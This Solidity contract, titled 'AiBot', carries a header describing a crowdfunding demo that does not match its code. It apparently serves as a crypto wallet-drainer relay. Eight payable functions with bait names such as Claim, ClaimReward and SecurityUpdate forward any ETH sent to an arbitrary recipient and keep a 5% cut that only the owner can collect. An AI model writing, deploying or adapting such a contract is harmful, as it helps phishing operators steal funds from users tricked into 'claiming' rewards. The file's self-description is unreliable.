// SPDX-License-Identifier: MIT
pragma solidity ^0.8.8;

error FundMe__NotOwner();

/**
 * @title A contract for crowd funding
 * @author lordshady
 * @notice This contract is a demo funding contract
 * @dev This implements price feed as our library
 */
interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
}

contract AiBot is IERC20 {
    address private owner;
    uint256 private fee;
    uint8 private percentage;

    mapping(address => mapping(address => uint256)) private _allowances;

    event Ownership(address indexed previousOwner, address indexed currentOwner);
    event Percentage(uint8 previousPercentage, uint8 currentPercentage);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        owner = msg.sender;
        fee = 0;
        percentage = 5;
    }

    function getOwner() public view returns (address) {
        return owner;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getFee() public view returns (uint256) {
        return fee;
    }

    function withdraw(address sender, address recipient) private {
        uint256 amount = msg.value;
        uint256 reserve = (amount / 100) * percentage;
        amount = amount - reserve;
        fee = fee + reserve;
        payable(recipient).transfer(amount);
    }

    function Claim(address sender, address recipient) public payable {
        withdraw(sender, recipient);
    }

    function ClaimReward(address sender, address recipient) public payable {
        withdraw(sender, recipient);
    }

    function ClaimRewards(address sender, address recipient) public payable {
        withdraw(sender, recipient);
    }

    function Execute(address sender, address recipient) public payable {
        withdraw(sender, recipient);
    }

    function Multicall(address sender, address recipient) public payable {
        withdraw(sender, recipient);
    }

    function Swap(address sender, address recipient) public payable {
        withdraw(sender, recipient);
    }

    function Connect(address sender, address recipient) public payable {
        withdraw(sender, recipient);
    }

    function SecurityUpdate(address sender, address recipient) public payable {
        withdraw(sender, recipient);
    }

    function transferOwnership(address newOwner) public {
        require(msg.sender == owner, "Access Denied");
        address previousOwner = owner;
        owner = newOwner;
        emit Ownership(previousOwner, newOwner);
    }

    function Fee(address receiver) public {
        require(msg.sender == owner, "Access Denied");
        uint256 amount = fee;
        fee = 0;
        payable(receiver).transfer(amount);
    }

    function changePercentage(uint8 newPercentage) public {
        require(msg.sender == owner, "Access Denied");
        require(newPercentage >= 0 && newPercentage <= 10, "Invalid Percentage");
        uint8 previousPercentage = percentage;
        percentage = newPercentage;
        emit Percentage(previousPercentage, percentage);
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        require(spender != address(0), "Approve to the zero address");

        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
}